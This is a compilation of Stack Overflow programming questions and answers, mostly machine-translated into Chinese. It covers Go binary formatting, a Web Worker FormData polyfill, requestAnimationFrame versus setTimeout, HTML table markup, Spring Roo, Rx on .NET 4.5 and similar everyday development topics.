通过使用 DBDataAdapter

摘自 ms 文档

```
// Create the DbDataAdapter.
DbDataAdapter adapter = new DbDataAdapter();
adapter.SelectCommand = command;

// Fill the DataTable.
DataTable table = new DataTable();
adapter.Fill(table); 
```

# binary - 从整数转换为其二进制表示

> ID：13870845
> 
> 赞同：88
> 
> 时间：2012-12-14T00:17:54.623
> 
> 标签：binary, go, numeric

有没有人知道Go中是否有任何内置功能可以将任何一种数字类型转换为其二进制数字形式。

例如，如果`123`是输入，则字符串`"1111011"`将是输出。

* * *

## 回答 #1

> 赞同：127
> 
> 时间：2012-12-14T00:21:43.797

该`strconv`包有`FormatInt`，它接受一个`int64`并让您指定基数。

```
n := int64(123)

fmt.Println(strconv.FormatInt(n, 2)) // 1111011 
```

***演示：*** [http ://play.golang.org/p/leGVAELMhv](http://play.golang.org/p/leGVAELMhv)

> [http://golang.org/pkg/strconv/#FormatInt](http://golang.org/pkg/strconv/#FormatInt)
> 
> `func FormatInt(i int64, base int) string`
> 
> FormatInt 返回给定基数中 i 的字符串表示形式，即 2 <= base <= 36。对于 >= 10 的数字值，结果使用小写字母 'a' 到 'z'。

* * *

## 回答 #2

> 赞同：72
> 
> 时间：2014-04-29T11:55:23.117

另请参阅[fmt](http://golang.org/pkg/fmt/)包：

```
n := int64(123)
fmt.Printf("%b", n)  // 1111011 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2015-08-21T13:57:14.997

此代码适用于大整数`*big.Int`：

```
x := big.NewInt(123)
s := fmt.Sprintf("%b", x)
// s == "1111011" 
```

因为`*big.Int`实现了[`fmt.Formatter`](https://golang.org/pkg/fmt/#Formatter)接口。

取自[https://stackoverflow.com/a/23317788/871134](https://stackoverflow.com/a/23317788/871134)

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2019-11-09T23:41:09.633

```
package main

import . "fmt"

func main(){
    Printf("%d == %08b\n",0,0)
    Printf("%d == %08b\n",1,1)
    Printf("%d == %08b\n",2,2)
    Printf("%d == %08b\n",3,3)
    Printf("%d == %08b\n",4,4)
    Printf("%d == %08b\n",5,5)
} 
```

结果是：

```
0 == 00000000
1 == 00000001
2 == 00000010
3 == 00000011
4 == 00000100
5 == 00000101 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2015-07-26T00:59:21.233

基于@Mark 提供的答案

尽管 OP 询问了如何打印整数，但我经常想查看超过 64 位的数据，而不会让我的眼睛难以置信：

```
/* --- Credit to Dave C in the comments --- */
package main

import (
    "bytes"
    "fmt"
)

func main() {
    fmt.Printf("<%s>\n", fmtBits([]byte{0xDE, 0xAD, 0xBE, 0xEF, 0xF0, 0x0D, 0xDE, 0xAD, 0xBE, 0xEF, 0xF0, 0x0D}))

    // OUTPUT:
    // <11011110 10101101 10111110 11101111 11110000 00001101 11011110 10101101 10111110 11101111 11110000 00001101>
}

func fmtBits(data []byte) []byte {
    var buf bytes.Buffer
    for _, b := range data {
        fmt.Fprintf(&buf, "%08b ", b)
    }
    buf.Truncate(buf.Len() - 1) // To remove extra space
    return buf.Bytes()
} 
```

[在 play.golang.org 中查看此代码](https://play.golang.org/p/ifobZWv_du)

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2020-07-26T22:06:49.190

接受答案的另一种方法是简单地做

```
s := fmt.Sprintf("%b", 123)
fmt.Println(s)                 // 1111011 
```

对于更丰富的表示，您可以使用`unsafe`包（强烈建议）作为

```
a := int64(123)
byteSliceRev := *(*[8]byte)(unsafe.Pointer(&a))
byteSlice := make([]byte, 8)
for i := 0; i < 8; i++ {
    byteSlice[i] = byteSliceRev[7 - i]
}
fmt.Printf("%b\n", byteSlice) 
```

这也适用于负整数。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2019-04-23T12:45:03.743

必须使用不安全指针才能正确表示二进制格式的负数。

```
package main

import (
    "fmt"
    "strconv"
    "unsafe"
)

func bInt(n int64) string {
    return strconv.FormatUint(*(*uint64)(unsafe.Pointer(&n)), 2)
}

func main() {
    fmt.Println(bInt(-1))
} 
```

[https://play.golang.org/p/GxXjjWMyC4x](https://play.golang.org/p/GxXjjWMyC4x)

# android - 在 Android 应用程序中使用的 Jetty HttpClient 达到连接限制后会发生什么？

> ID：13870849
> 
> 赞同：0
> 
> 时间：2012-12-14T00:18:41.123
> 
> 标签：android, spring, jetty, rest-client, android-annotations

我有一个客户端，它使用 android-annotations 的 RestClient 通过 http 不断与服务器通信。

每次应用程序长时间打开并发出大量请求时，新的 http 请求都会超时，没有结果，服务器端也没有错误。关闭应用程序并再次打开它可以解决所有问题。

我不太确定，但我猜它与以下参数有关：

```
HttpClient client = new HttpClient();
client.setConnectorType(HttpClient.CONNECTOR_SELECT_CHANNEL);
client.setMaxConnectionsPerAddress(200); // max 200 concurrent connections to every address
client.setThreadPool(new QueuedThreadPool(250)); // max 250 threads
client.setTimeout(30000); // 30 seconds timeout; if no server reply, the request expires
client.start(); 
```

所以，我的问题是，在限制 200 之后会发生什么`maxConnectionsPerAddress`？这可能是我的网络连接在太多请求后挂起的原因吗？如果是这样，我可以简单地增加这个数字还是这样做有任何性能问题？

# javascript - 通过 ID 而非名称形成输入值

> ID：13870850
> 
> 赞同：2
> 
> 时间：2012-12-14T00:18:44.813
> 
> 标签：javascript, html

我有一个带有名称和 id 的输入的表单。

当我尝试使用 获取输入的值时，`document.getElementById`出现错误。

我可以通过使用表单名称和输入名称来访问该元素，但这会使脚本变得不那么灵活。

任何解决方法？

这是我的代码：

```
<form name='myform'>
   <input name='n1' id='i1' value='stuff'>
</form>

<script>
   var s=document.getElementById("i1").value;
   alert(s);
</script> 
```

我有一个外部 .js 文件中的脚本，我想确保如果有人更改表单的名称，该脚本仍然有效。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-14T00:23:26.153

你的代码工作得很好，看看这个[例子](http://jsfiddle.net/gaby/vvs9d/)

只需确保在 DOM 准备好后调用脚本。还要确保没有其他元素具有相同的`id`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T00:26:24.060

检查是否支持

```
function getElement (id)
{
   if (document.getElementById)
   {
      return document.getElementById(id);
   }
   else if (document.all)
   {
      return window.document.all[id];
   }
   else if (document.layers)
   {
      return window.document.layers[id];
   }
} 
```

# jquery - AJAX 错误函数总是触发

> ID：13870851
> 
> 赞同：0
> 
> 时间：2012-12-14T00:18:52.643
> 
> 标签：jquery, ajax, jsonp

我有一个函数，我想用它来处理我所有的 AJAX JSONP 请求。它以我希望的方式工作，错误处理程序总是触发一个问题。预期的回调函数会触发并从服务器获得正确的响应，但错误处理程序也会触发。

```
function get_my_json(object_of_request_data,callback_function) {
  $.ajax({
    url: "myurl.com/getjson.php",
    dataType: "jsonp",
    data: object_of_request_data,
    jsonpCallback: callback_function,
    error: function(jqXHR,textStatus,errorThrown) {
      //textStatus is usually "parseerror"
      //errorThrown will say the callback was not called (even though it is)
      console.log("I always fire");
    }
  });
}

function my_callback(data) {
   alert("I get called before the error with a valid json object");
}

get_my_json({get_me:"some data"},"my_callback"); 
```

我可以忽略该错误，但我想修复它。有任何想法吗？

大多数其他类似的主题/问题都处理未触发的回调，这对我来说并非如此。

# php - 未定义 FormData 时如何在 Web Workers 中上传文件

> ID：13870853
> 
> 赞同：9
> 
> 时间：2012-12-14T00:19:06.420
> 
> 标签：php, javascript, html, xmlhttprequest, web-worker

`$_FILES`当我通过 Web Worker 上传时，如何在 PHP 中检索？当我尝试使用`FormData`时，出现以下错误：

> 错误：未定义 FormData

这是我的代码：

```
function uploadFile(blobFile, fileName, filePart, totalChunks) {
    //if I try to put this
    //var formData = new FormData(); //it does not work
    var xhr = new XMLHttpRequest();                
    xhr.open("POST", "upload.php"+"?"+"file="+fileName + filePart, true);
    xhr.onload = function(e) {};
    xhr.send(blobFile);
} 
```

那么在 upload.php 中我应该如何获取 tmp 路径`$_FILES`？以防万一，我还将显示引用 Web 工作者的页面：

```
<form id="fileuploader" enctype="multipart/form-data" method="post" action="upload.php">
    <label for="fileToUpload">Select Files to Upload</label><br />
    <input type="file" name="fileToUpload[]" multiple="" id="fileToUpload" onchange="fileList();"/><br />
    <input type="button" onclick="sendRequest();" value="Upload" />
    <!-- a place for File Listing -->
    <div id="fileList"></div>           
</form>
<script type="text/javascript">
function sendRequest() {
    var worker = new Worker("fileupload.js");
    worker.onmessage = function(e) {
        alert(e.data);
    }
    var file = document.getElementById('fileToUpload');
    for(var i = 0; i < file.files.length; i++) { 
        worker.postMessage(file.files[i]);  
    }
} 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-20T10:30:56.473

我编写了以下 polyfill 来模拟`FormData`Web Workers 中的方法。由于 Web Worker 不支持 DOM，因此`new FormData(<HTMLFormElement>);`也不支持构造函数调用。虽然 polyfill 支持对象、类型化数组和字符串
`File`。`Blob`

它最初是作为[Upload a File in a Google Chrome Extension](https://stackoverflow.com/a/10002486/938089)答案的一部分发布的。要查看如何使用它的示例，请查看其他答案。

```
/*
 * FormData for XMLHttpRequest 2  -  Polyfill for Web Worker  (c) 2012 Rob W
 * License: Creative Commons BY - http://creativecommons.org/licenses/by/3.0/
 * - append(name, value[, filename])
 * - toString: Returns an ArrayBuffer object
 * 
 * Specification: http://www.w3.org/TR/XMLHttpRequest/#formdata
 *                http://www.w3.org/TR/XMLHttpRequest/#the-send-method
 * The .append() implementation also accepts Uint8Array and ArrayBuffer objects
 * Web Workers do not natively support FormData:
 *                http://dev.w3.org/html5/workers/#apis-available-to-workers
 **/
(function() {
    // Export variable to the global scope
    (this == undefined ? self : this)['FormData'] = FormData;

    var ___send$rw = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype['send'] = function(data) {
        if (data instanceof FormData) {
            if (!data.__endedMultipart) data.__append('--' + data.boundary + '--\r\n');
            data.__endedMultipart = true;
            this.setRequestHeader('Content-Type', 'multipart/form-data; boundary=' + data.boundary);
            data = new Uint8Array(data.data).buffer;
        }
        // Invoke original XHR.send
        return ___send$rw.call(this, data);
    };

    function FormData() {
        // Force a Constructor
        if (!(this instanceof FormData)) return new FormData();
        // Generate a random boundary - This must be unique with respect to the form's contents.
        this.boundary = '------RWWorkerFormDataBoundary' + Math.random().toString(36);
        var internal_data = this.data = [];
        /**
        * Internal method.
        * @param inp String | ArrayBuffer | Uint8Array  Input
        */
        this.__append = function(inp) {
            var i=0, len;
            if (typeof inp === 'string') {
                for (len=inp.length; i<len; i++)
                    internal_data.push(inp.charCodeAt(i) & 0xff);
            } else if (inp && inp.byteLength) {/*If ArrayBuffer or typed array */
                if (!('byteOffset' in inp))   /* If ArrayBuffer, wrap in view */
                    inp = new Uint8Array(inp);
                for (len=inp.byteLength; i<len; i++)
                    internal_data.push(inp[i] & 0xff);
            }
        };
    }
    /**
    * @param name     String                                  Key name
    * @param value    String|Blob|File|Uint8Array|ArrayBuffer Value
    * @param filename String                                  Optional File name (when value is not a string).
    **/
    FormData.prototype['append'] = function(name, value, filename) {
        if (this.__endedMultipart) {
            // Truncate the closing boundary
            this.data.length -= this.boundary.length + 6;
            this.__endedMultipart = false;
        }
        var valueType = Object.prototype.toString.call(value),
            part = '--' + this.boundary + '\r\n' + 
                'Content-Disposition: form-data; name="' + name + '"';

        if (/^\[object (?:Blob|File)(?:Constructor)?\]$/.test(valueType)) {
            return this.append(name,
                            new Uint8Array(new FileReaderSync().readAsArrayBuffer(value)),
                            filename || value.name);
        } else if (/^\[object (?:Uint8Array|ArrayBuffer)(?:Constructor)?\]$/.test(valueType)) {
            part += '; filename="'+ (filename || 'blob').replace(/"/g,'%22') +'"\r\n';
            part += 'Content-Type: application/octet-stream\r\n\r\n';
            this.__append(part);
            this.__append(value);
            part = '\r\n';
        } else {
            part += '\r\n\r\n' + value + '\r\n';
        }
        this.__append(part);
    };
})(); 
```

# wordpress - 用于 wordpress 的 Nivo Slider 未加载图像 - 服务器响应 404 错误

> ID：13870856
> 
> 赞同：2
> 
> 时间：2012-12-14T00:20:02.287
> 
> 标签：wordpress, slider, http-status-code-404, nivo-slider

我在我正在处理的网站上安装了用于 wordpress 的 Nivo 滑块。该插件一直运行良好，直到最近我对自定义主题进行了一系列看似无关的更改后它突然停止工作。

滑块在控制台中显示以下错误：

```
Failed to load resource: the server responded with a status of 404 (Not Found) http://50.116.65.195/~cooperfd/wp-content/uploads/nivoslider4wp_files/17_s.png 
```

我无法通过我的网络浏览器看到这个文件，但是，如果我在我的 FTP 客户端导航到这个位置，文件就在那里。文件和文件夹的所有权限都设置为 777。

如果它有任何区别，我也无法从插件的后端看到文件。

任何帮助将不胜感激，

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-07-01T11:59:50.953

我经历了同样的事情，就我而言，罪魁祸首是在 Linux 上运行的服务器。图像的名称是大写字母，而在页面上，它们是小写字母。我的本地 Windows 机器在访问这些图片时没有显示任何问题，但是一旦将它们上传到服务器上，它们就无法访问。因此，请检查图像名称的拼写/大小写。

# system.reactive - 从 .NET Framework 4.5 使用 Rx 有什么技巧吗？

> ID：13870857
> 
> 赞同：4
> 
> 时间：2012-12-14T00:20:18.357
> 
> 标签：system.reactive, .net-4.5

我有一个类库项目（VS2012，.NET Framework 4.5）。我使用 NuGet 安装了 Rx Main 2.0.21114。编译给了我大量的性质警告：

> C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Common.targets(1360,9): 警告 MSB3268: 主要参考“System.Reactive.Core, Version=2.0.20823.0, Culture=neutral, PublicKeyToken =f300afd708cefcd3, processorArchitecture=MSIL" 无法解析，因为它间接依赖于框架程序集 "System.Runtime, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" 在当前目标框架中无法解析. “.NETFramework，版本=v4.5”。要解决此问题，请删除引用“System.Reactive.Core, Version=2.0.20823.0, Culture=neutral, PublicKeyToken=f300afd708cefcd3, processorArchitecture=MSIL”或将您的应用程序重新定位到包含“System.Runtime, Version”的框架版本=4.0.0.0，文化=中立，

然后无法解析 Rx 程序集中的任何符号。我已经验证项目引用指向 Rx 安装下的 Net45 文件夹。我在 Google 上的点击率为零，所以我假设在 4.5 上使用 Rx 非常简单。关于是什么导致我遇到这个问题的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T11:54:59.613

首先，请注意错误消息中的 Rx 版本 (2.0.20823.0) 与您在问题中提到的版本 (2.0.21114) 不匹配。20823 是 4 个版本之前。

更相关的是，System.Runtime 是可移植类库和 Windows 应用商店应用程序中使用的程序集。这与您的目标不符，您选择了完整的框架。它确实与我从 Nuget 看到的匹配，我只看到 Rx 的商店版本可用。

我不清楚您如何设法添加对它的引用，我自己无法完成。我只能猜测您以某种方式获得了对您之前安装在计算机上的旧版本（例如 20823）的引用，并且通过安装新版本得到了修改。像这样，鞋子合脚。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-14T09:09:10.310

这通常意味着以某种方式引用了 Rx 4.0 DLL。核对引用并明确将它们指向 Rx 4.5 版本

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-14T20:31:02.360

好吧，事实证明这对我当前的机器/VS2012 安装有些古怪。我们在另一个开发盒上尝试了一个普通项目，在我的盒子上尝试了同一个项目；它在那里按预期工作，但在这里失败并显示相同的消息。我已经创建了一个新的虚拟机和开发环境，一切都如宣传的那样。

感谢您的建议。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-14T19:40:38.057

这有时会发生在使用 Rx 的 F# 项目中，解决方法是引用`System.ComponentModel.Composition`您的项目。我认为便携式图书馆系统的怪癖。

# java - 带有 Intellij IDEA 12 的 Spring Roo v1.1.5

> ID：13870862
> 
> 赞同：0
> 
> 时间：2012-12-14T00:21:18.913
> 
> 标签：java, intellij-idea, spring-roo

我正在尝试将 Spring Roo 与 Intellj IDEA 12 和 Jdk 7 一起使用。我将 Roo 工具配置窗口中的 Roo Home 路径设置为 Spring Roo 1.1.5 文件夹。现在，当我启动 Roo 控制台时，我收到了一堆错误消息。

**错误消息的片段**

> framework.BundleException：捆绑包org.springframework.roo.addon.configurable [8]中未解决的约束：无法解决8.0：缺少要求[8.0]包；(&(package=org.springframework.roo.classpath)(version>=1.1.0)(!(version>=2.0.0))) [引起：无法解析36.0：缺少需求[36.0]包；(&(package=org.springframework.roo.file.monitor)(version>=1.1.0)(!(version>=2.0.0))) [引起：无法解决39.0：缺少要求[39.0]包; (&(package=org.springframework.roo.support.ant)(version>=1.1.0)(!(version>=2.0.0))) [引起：无法解决52.0：缺少要求[52.0]包; (package=javax.xml.namespace)]]]) 错误：错误启动文件：/C:/Program%20Files/springsource/spring-roo-1.1.5.RELEASE/bundle/org.springframework.roo.addon.creator -1.1.5.RELEASE.jar (org.osgi. framework.BundleException：捆绑包org.springframework.roo.addon.creator [9]中未解决的约束：无法解决9.0：缺少要求[9.0]包；(package=javax.xml.parsers)) 错误：错误启动文件：/C:/Program%20Files/springsource/spring-roo-1.1.5.RELEASE/bundle/org.springframework.roo.addon.dbre-1.1。 5.RELEASE.jar (org.osgi.framework.BundleException: Unresolved constraint in bundle org.springframework.roo.addon.dbre [10]: Unable to resolve 10.0: missing requirements [10.0] package; (package=javax.xml.解析器））

我不确定是什么导致了这个错误。我还没有尝试过使用不同的 jdk。有遇到类似问题的 Intellij Spring-Roo 用户吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-11T19:04:09.497

我相信包含 Roo 的 Felix 版本与 Java 7 不兼容。这对我有用。

在 $ROO_HOME/bin 中，将 org.apache.felix.framework-3.xxjar 替换为较新版本的 Felix。我使用了 org.apache.felix.framework-3.2.2.jar。

我从这里下载了 Felix：http: [//archive.apache.org/dist/felix/](http://archive.apache.org/dist/felix/)

无需更改 jar 的名称。roo.sh 脚本将目录中的所有 jar 加载到类路径中。因此，您必须删除旧版本（并可能在某处备份）。

# javascript - requestAnimFrame 与普通的旧 settimeout javascript

> ID：13870878
> 
> 赞同：3
> 
> 时间：2012-12-14T00:23:17.143
> 
> 标签：javascript, ajax, settimeout

在编写脚本时，我注意到我的 ajax 比预期的要多 10 倍，所以我输入了一个“fps 计数器”，并注意到不是像预期的那样每秒运行 10 次，而是每秒运行大约 130 次 ie/ff/歌剧大约每秒 35 帧。使用以下设置：

```
function load(){ 
//other code that does not effect this
    requestAnimFrame(function(){
        load();
    });
    debug();//function i was using to catch fps
}

window.requestAnimFrame = (function(callback){
    return window.requestAnimationFrame ||
    window.webkitRequestAnimationFrame ||
    window.mozRequestAnimationFrame ||
    window.oRequestAnimationFrame ||
    window.msRequestAnimationFrame ||
    function(callback){
        window.setTimeout(callback, 100);
    };
})(); 
```

现在谷歌浏览器似乎并不关心我在 window.setTimeout(callback, 100); 它可能是 1 也可能是 10000000 它以大约 130 帧的速度运行，而其余的似乎足够接近它（总是大约是预期的 3 倍）并且我已经确保我没有多次调用 load()

另一方面，我曾经使用 setTimeout(load, 100); 当我更改为所有浏览器开始以大约 30fps 的速度运行时

```
function load(){ 
    //other code that does not effect this

        debug();//function i was using to catch fps
        setTimeout(load, 100);
    } 
```

这样做是不好的做法还是过时了？重点是我不太确定为什么我使用 requestAnimFrame，然后我在网上找到的所有示例也都使用它，而且它似乎实现了给定的目标。我一遍又一遍地发射负载的唯一原因是检查并查看是否有任何新信息要下来..

***编辑***对于那些将来阅读本文的人。通过代码逐行运行后，我发现逻辑错误解释了我的 3x。我确实确保我没有在原地调用 load() ，但是

```
function connected(result){
    if (xmlhttp.readyState==4 && xmlhttp.status==200){
        //code that does not matter for this
    }else if (xmlhttp.status==404){
        alert("epic failure i lost the page");
    }
    d_time = new Date().getTime();
    load();
} 
```

Connect 被 xmlhttp.onreadystatechange=connected 调用；所以它可以多次运行 3 组 load(); 我需要做的是：

```
function connected(result){
    if (xmlhttp.readyState==4 && xmlhttp.status==200){
        d_time = new Date().getTime();
        load();
    }else if (xmlhttp.status==404){
        alert("epic failure i lost the page");
    }

} 
```

所以施密特和帕特里克都在这里帮忙。施密特让我知道我是一个菜鸟并且做错了。patrick 帮助我准确了解该功能发生了什么

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T00:34:11.763

定义函数

window.requestAnimFrame()

如果其他功能都不存在，这种方式只会使用 setTimeout。它可以更明确地重写为：

```
window.requestAnimFrame = (function(callback){
    var theFunction;
    if (window.requestAnimationFrame) {
        theFunction = window.requestAnimationFrame;
    } else if (window.webkitRequestAnimationFrame) {
        theFunction = window.webkitRequestAnimationFrame;
    } else if (window.mozRequestAnimationFrame) {
        theFunction = window.mozRequestAnimationFrame;
    } else if (window.oRequestAnimationFrame) {
        theFunction = window.oRequestAnimationFrame;
    } else if (window.msRequestAnimationFrame) {
        theFunction = window.msRequestAnimationFrame;
    } else {
        theFunction = function(callback){
            window.setTimeout(callback, 100);
        };
    } 
    return theFunction;
})(); 
```

因此，如果其他功能都不存在，它只会使用超时。此函数用于在 requestAnimationFrame 不存在的情况下依赖其专有实现，例如在旧浏览器上。那些旧浏览器将使用超时。

根据定义， requestAnimationFrame 的帧率将由客户端确定。这意味着它可以每秒运行 180 倍（就像您在 chrome 中看到的那样）或每秒 1 倍。它允许客户端浏览器确定最重要的是什么，并使其在没有必要时关闭屏幕刷新的方法（就像选项卡未处于活动状态或移动浏览器最小化时）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-14T00:43:30.480

[http://jsfiddle.net/VMyn8/1/](http://jsfiddle.net/VMyn8/1/)

我确实相信您的 fps 计时器是错误的。我在`webkitRequestAnimationFrame`.

```
var last = new Date(),
    frames = [],
    div = document.getElementById("fps");

(function loop(){
    var span = ((new Date()) - last)/1000;
    last = new Date();
    frames.push(span);

    if (frames.length > 100) frames.shift();

    var total = 0;    
    for (var i = 0; i < frames.length; i++)total += frames[i];    

    div.innerHTML = Math.floor(frames.length/total);
    //setTimeout(loop, 1000/60);
    webkitRequestAnimationFrame(loop);
})(); 
```

如果您尝试轮询服务器，我会建议一些完全不同的东西：

```
(function poll(){
    // do some stuff

    setTimeout(poll, 3000); // poll every 3 seconds
    // if you are doing an ajax call, you'll want to place the timeout in the 
    // callback so you aren't initiating another call before you've received 
    // a response to the current one. 
})(); 
```

# c# - Serialize a Form along with all its data in C#

> ID：13870879
> 
> 赞同：0
> 
> 时间：2012-12-14T00:23:19.630
> 
> 标签：c#, serialization, savestate

I'm guessing that the best way to do this is by using XML. Here's the issue, tho:

```
 Hero hero;
    PictureBox heroPB;
    Dictionary <string,Point> pokedex;
    Boss boss;
    PictureBox bossPB;
    Attack attack;
    PictureBox attackPB;
    HPMeter bossHP;
    PictureBox bossHPPB;
    PPMeter heroPP;
    PictureBox heroPPPB;

    System.Timers.Timer animateAttack;
    System.Timers.Timer animateBoss;
    System.Timers.Timer checkHit;
    System.Timers.Timer winFade;
    Thread tr;
    Rectangle bossRect;
    Rectangle attackRect;
    Panel whiteout;

    int heroState = 2;
    int stepRate = 5;
    int attackDirection;
    int attackLoop = 0;
    int contadorPaso = 0;
    int contadorPasoBoss = 0;
    int bossTop, bossLeft;
    int bossState = 6;
    int bossHealth = 0;
    int bossHPCap = 0;
    int opa = 0;
    int battlesWon = 0;
    int mainBossCounter = 0;
    int ppleft = 0;
    bool paso = false;
    bool inStadium = false;
    bool fading = true;
    bool fightingMainBoss = false;
    bool fainted;
    string currentPokemon = "";

    Rectangle[] frames;
    Rectangle[] entrances;
    PictureBox[] boundaries;
    Random r;
    Random eth;

    public delegate void BeginFade();
    BeginFade fade; 
```

I have more than a few objects/primitives which are constantly changing. Is there an efficient way to serialize the whole thing and load it the next time the program runs?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:42:26.153

真的没有简单的方法来保存这些数据。我个人认为 XML 不是最好的途径。这对对象很好，对其他一切都不好。我更倾向于将其编写为带有“杂项”对象的 JSON，该对象具有所有单独的原语。实际上，我最倾向于制作自己的配置文件读取器/写入器并编写更像 csv 的东西。我工作地点的大多数配置文件至少有这么多数据。我们使用`key=value`所有的原语。每个对象都有自己的部分，其中它们的原语以`key=value`格式列出，列表将是`key=value1,value2,value3`. 我个人认为这是一种相当简单的做事方式，编写读写器类不会花费很长时间。事实上，从头开始制作一个简单的读取器/写入器可能比在 JSON 或 XML 序列化类之上构建一个更快。我真的没有看到这两种格式中的任何一种对你有多大好处。

# html - Why do the html table rows appear in reverse order?

> ID：13870881
> 
> 赞同：5
> 
> 时间：2012-12-14T00:23:41.127
> 
> 标签：html, html-table, rows

Here is my code:

```
<table width="100%" cellspacing="0" cellpadding="0" border="0">

<tr align="center">
    <td align="left" width="180">
        <a href="http://www.blabllablbalbla.com/"> <img border="0" alt="bablablabla"
        height="" src="/include/img/logo-beta.png"></img> </a>
    </td>
    <td align="right"><a href="http://support.blablalblbalabl.com">Help Center</a> | <a 
        href="/auth/login">Sign In</a>
    </td>
</tr>
<tr>
    whyyyyyyyy does this appear on top???!
</tr>

</table> 
```

and here is my js fiddle [http://jsfiddle.net/PQZTL/1/](http://jsfiddle.net/PQZTL/1/)

I want the text to be below the broken image.

Can somebody explain this to me?

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-14T07:22:07.333

给出的建议，添加`<td>`标签，解决了实际问题，但至于“为什么”的问题，答案是当浏览器解析表格并发现任何超出正确语法的内容时，它们只是将其收集并放在*前面*桌子。

所以“为什么这会出现在顶部？？？！” 并没有真正被视为放置在另一行之前的行，而是作为行外的垃圾并倾倒在桌子前面。您可以通过使用样式表规则来查看这一点，例如`table { border: solid red }`; 然后文本出现在边框之外。

这种浏览器行为在 HTML5 草案中被描述为“养育子女”，[在表格中的意外标记](http://www.w3.org/TR/html5/the-end.html#unexpected-markup-in-tables)部分中。（标题有点误导，因为浏览器真的准备好以特定方式处理这种情况；所以它实际上是关于处理表格中的*错误*标记。）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-14T00:24:40.163

```
<tr>
    whyyyyyyyy does this appear on top???!
</tr> 
```

因为您忘记了`<td>`使 HTML 无效并且呈现不正确的元素。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-14T00:32:20.347

每个表格行都需要有单元格，要么是 th（标题单元格），要么是 td。

换句话说，正确的代码就像我在下面显示的那样：

如果您希望底行像我在下面所做的那样跨越上述两个单元格，您可以使用 colspan="2" ，或者您可以使用两个单元格（即为什么这会出现在顶部？？

```
<table width="100%" cellspacing="0" cellpadding="0" border="0">
  <tr align="center">
    <td align="left" width="180">
        <a href="http://www.blabllablbalbla.com/"> <img border="0" alt="bablablabla"
        height="" src="/img/logo-beta.png"></img> </a>
    </td>
    <td align="right"><a href="http://support.blablalblbalabl.com">Help Center</a> | <a 
        href="/auth/login">Sign In</a>
    </td>
 </tr>
 <tr>
    <td colspan="2">
    whyyyyyyyy does this appear on top???!
    </td>  
 </tr>
</table>​​​ 
```

希望这可以帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-14T00:26:46.120

您缺少`<td>`围绕显示在顶部的内容的一组标签：

```
<tr>
    <td>whyyyyyyyy does this appear on top???!</td>
</tr> 
```

# ruby-on-rails - 考虑到我可以使用 --debugger 启动调试，我可以在启动控制台后将其关闭吗？

> ID：13870882
> 
> 赞同：1
> 
> 时间：2012-12-14T00:23:59.167
> 
> 标签：ruby-on-rails, ruby-on-rails-3, debugging

假设我使用 --debugger 启动控制台。然后我可以以某种方式关闭调试器选项吗？我知道有一些解决方法（例如，在您的代码中放置一个 @debug_on 字段）但似乎我应该能够从控制台中随意关闭和打开调试器。我的研究表明这是不可能的。

如果答案是否定的，您认为我可以向 Rails 代码提交拉取请求以实现它是否足够容易？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-21T18:50:51.890

由于该`--debugger`选项只需要“调试器”gem，因此您可以尝试卸载/取消对库的要求。有一些资源可以帮助您解决这个问题，只需使用 Google。这通常意味着[删除](http://ruby-doc.org/core-1.9.3/Module.html#method-i-remove_const)库定义的所有常量。

# jenkins - Executing Selenium tests in Jenkins and export Test Result in TestLink

> ID：13870884
> 
> 赞同：0
> 
> 时间：2012-12-14T00:24:17.757
> 
> 标签：jenkins, selenium-rc, testng, jenkins-plugins, testlink

I'd like to run Selenium tests with Jenkins and export results in TestLink.

I followed this tutorial : [https://wiki.jenkins-ci.org/display/JENKINS/TestLink+Plugin](https://wiki.jenkins-ci.org/display/JENKINS/TestLink+Plugin)

I managed to run tests from jenkins and exported the result in TestLink but only the test example which did not use selenium.

When I replaced it by a selenium-made test (exported in "Java TestNG RC") I got some errors at compilation ("class, interface, or enum expected","illegal character","illegal statement", ...)

Do I have to install a plugin for selenium or something else?

Help is appreciated.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T10:49:08.773

事实上，我在 TestNG 中很好地运行了测试，问题出在 Selenium 上。如果我必须在 test.java 中导入类或者我必须在我的工作区中放置一些东西，我不知道该怎么做......

这是一个非常简单的测试示例：

```
package com.example.tests;

import com.thoughtworks.selenium.*;
import org.testng.annotations.*;
import static org.testng.Assert.*;
import java.util.regex.Pattern;

public class try extends SeleneseTestNgHelper {
    @Test public void testTry() throws Exception {
        selenium.open("www.google.fr");
        selenium.waitForPageToLoad("30000");
    }
} 
```

和我得到的错误：

```
error: package com.thoughtworks.selenium does not exist
error : cannot find symbol (i got this one about 17 times). 
```

我想我必须把 selenium-java 放在某个地方，但我不知道在哪里......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T03:59:41.507

我的经验是您不能信任 IDE 创建的代码。我在里面扔了很多没用的东西。我在 ruby​​ 中工作，第一次尝试运行从 IDE 导出的一段代码时，它惨遭失败。它不会在java中编译并不奇怪。你最好自己编码。IDE 是学习概念的好工具，但您确实需要快速超越它。

